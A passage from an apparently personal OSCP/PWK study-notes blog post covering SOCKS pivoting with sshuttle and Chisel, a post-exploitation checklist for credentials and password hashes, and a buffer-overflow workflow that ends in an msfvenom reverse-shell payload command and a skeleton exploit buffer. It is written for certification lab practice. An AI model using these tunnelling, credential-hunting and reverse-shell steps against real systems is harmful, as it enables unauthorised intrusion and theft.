<p>Another nice addition to the proxying portfolio is <code>sshuttle</code>, it does some magic to automatically proxy traffic from your host to a certain subnet through the target system.</p>
<pre tabindex=0><code>sshuttle -r $USERNAME@$RHOST 10.1.1.0/24
</code></pre><p>If you only have Windows systems to deal with, <code>Chisel</code> comes highly recommended. It&rsquo;s a bit more complicated to set up a full SOCKS proxy, as it requires two sessions on the target. The required commands are as below.</p>
<blockquote>
<p>On Kali:</p>
<pre tabindex=0><code>./chisel server -p 8000 --reverse
</code></pre><p>On target:</p>
<pre tabindex=0><code>.\chisel_windows_386.exe client $LHOST:8000 R:8001:127.0.0.1:9001
</code></pre><p>Now we are listening on localhost:8001 on kali to forward that traffic to target:9001.</p>
<p>Then, open the Socks server:
On target:</p>
<pre tabindex=0><code>.\chisel_windows_386.exe server -p 9001 --socks5
</code></pre><p>On Kali:</p>
<pre tabindex=0><code>./chisel client localhost:8001 socks
</code></pre></blockquote>
<h2 id=post-exploitation-enumeration>Post-exploitation Enumeration</h2>
<p>In general, the things you are looking for will stand out quite a bit in the PWK labs. It is nonetheless critical to spend enough time in post-enumeration, as otherwise you will surely miss the entry points of several machines. Very briefly speaking, the things you are looking for are as follow.</p>
<ul>
<li><code>Proof.txt</code> files (duh)</li>
<li>Accounts on the machine (<code>/etc/passwd</code> or <code>hashdump</code>)</li>
<li>Credentials in files of several formats (plaintext, KeePass-files, RDP files, etc.)</li>
<li>Credentials in services (FTP servers, databases)</li>
<li>Interesting files in home directories</li>
<li>Activity between multiple machines (ARP tables or <code>netstat</code>)</li>
</ul>
<blockquote>
<p>If you encounter a machine in the PWK labs that references specific names or <em>any</em> type of user action, make good note of that and come back to it later. You likely found a hint for a client-side exploit or relation between two machines.</p>
</blockquote>
<h2 id=buffer-overflows>Buffer Overflows</h2>
<p>Buffer overflows are a skill you definitely have to practice well before your exam. I have included my (<em>very</em> basic) command reference below, but I would recommend looking at resources that explain it better. A good overview of the process is provided <a href=https://guif.re/bo>here</a>. The PWK course materials also do a great job explaining the process, and the &ldquo;Extra Miles&rdquo; exercises are definitely worth doing.</p>
<h3 id=fuzz-buffer-length>Fuzz buffer length</h3>
<p>Manually or by using a Python script.</p>
<h3 id=find-eip-offset>Find EIP offset</h3>
<p><code>msf-pattern_create -l [length]</code></p>
<p>Find EIP value, then
<code>msf-pattern_offset -l [length] -q [EIP-query]</code></p>
<h3 id=determine-slack-space>Determine &lsquo;slack space&rsquo;</h3>
<p>Does the exploit code (and prior to that, your list of badchars) fit AFTER <code>EIP</code>? Can we reference it there? Alternatively, fit the exploit code and/or list of badchars in the buffer itself.</p>
<h3 id=find-bad-chars>Find bad chars</h3>
<p>Good <a href=https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/>overview</a> provided here. I prefer doing it manually.</p>
<h3 id=find-suitable-memory-address>Find suitable memory address</h3>
<h4 id=find-opcode>Find opcode</h4>
<p>Find a suitable instruction
<code>msf-nasm_shell</code></p>
<pre tabindex=0><code>nasm &gt; jmp esp
00000000  FFE4              jmp esp
</code></pre><blockquote>
<p>Note: Try <code>call</code> if <code>jmp</code> is not found!</p>
</blockquote>
<h4 id=find-address>Find address</h4>
<p>In Unity debugger with Mona find a module without protections.
<code>!mona modules</code></p>
<p>Then find the addresses to place in <code>EIP</code>.
<code>!mona find -s '\xff\xe4' -m module.dll</code></p>
<blockquote>
<p>Note: Mona has some additional, powerful features to find a suitable memory address. You can use for example <code>!mona jmp -r esp -cpb "BADCHARS"</code> to find any <code>JMP ESP</code> or <code>CALL ESP</code>, whilst leaving out addresses with bad characters. Note that Mona returns addresses for all modules by default, so you still have to look at the protections.</p>
</blockquote>
<p>Addresses in little endian format, so address <code>0xabcdef10</code> becomes <code>\x10\xef\xcd\xab</code>.</p>
<h3 id=generate-shellcode>Generate shellcode</h3>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msfvenom -p windows/shell_reverse_tcp <span style=color:#40ffff>LHOST</span>=<span style=color:#40ffff>$LHOST</span> <span style=color:#40ffff>LPORT</span>=<span style=color:#40ffff>$LPORT</span> <span style=color:#40ffff>EXITFUNC</span>=thread -f py -b <span style=color:#ed9d13>&#39;\x00&#39;</span>
</code></pre></div><h3 id=add-nop-sled>Add NOP sled</h3>
<p>Just to ensure the payload is referenced correctly.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>nopsled = <span style=color:#ed9d13>&#39;</span><span style=color:#ed9d13>\x90</span><span style=color:#ed9d13>&#39;</span> * <span style=color:#3677a9>16</span>
</code></pre></div><h3 id=finalize-exploit>Finalize exploit</h3>
<p>At a high level, your buffer becomes something like the following for a simple BoF.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>buffer = <span style=color:#ed9d13>&#34;A&#34;</span> * <span style=color:#3677a9>1337</span> <span style=color:#999;font-style:italic># Identified overflow offset</span>
buffer += <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\x10\xef\xcd\xab</span><span style=color:#ed9d13>&#34;</span> <span style=color:#999;font-style:italic># EIP, pointing to your chosen instruction (e.g. JMP ESP)</span>
buffer += <span style=color:#ed9d13>&#34;</span><span style=color:#ed9d13>\x90</span><span style=color:#ed9d13>&#34;</span> * <span style=color:#3677a9>16</span> <span style=color:#999;font-style:italic># NOP sled</span>
buffer += exploit_code
</code></pre></div>
</div>
</article>
<hr>
<div class=post-info>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
<span class=tag><a href=https://casvancooten.com/tags/pwk/>PWK</a></span>
<span class=tag><a href=https://casvancooten.com/tags/oscp/>OSCP</a></span>
<span class=tag><a href=https://casvancooten.com/tags/hacking/>Hacking</a></span>
</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
3778 Words
</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
03-05-2020
(Last updated: 22-02-2022)
</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"/><line x1="1.05" y1="12" x2="7" y2="12"/><line x1="17.01" y1="12" x2="22.96" y2="12"/></svg>
<a href=7cbc6db5d409b09dcd74dafef99c2761d5bb7cdb target=_blank rel=noopener>7cbc6db</a>
@ 22-02-2022
</p>
</div>
<div class=pagination>
<div class=pagination__buttons>
<span class="button previous">
<a href=https://casvancooten.com/posts/2020/05/generating-pretty-pwk-reports-with-pandoc-and-markdown-templates-inside/>
<span class=button__icon>‚Üê</span>
<span class=button__text>Generating pretty PWK reports with Pandoc and Markdown (templates inside!)</span>
</a>
</span>
</div>
</div>
</main>
</div>
<footer class=footer>
<div class=footer__inner>
<div class=footer__content>
<span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span>
<span><a href=https://casvancooten.com/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
</div>
</div>
<div class=footer__inner>
<div class=footer__content>
<span><a href=http://gohugo.io>Hugo</a> theme by <a href=https://github.com/rhazdon>rhazdon</a></span>
</div>
</div>
</footer>
</div>
<script type=text/javascript src=/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
</body>
</html>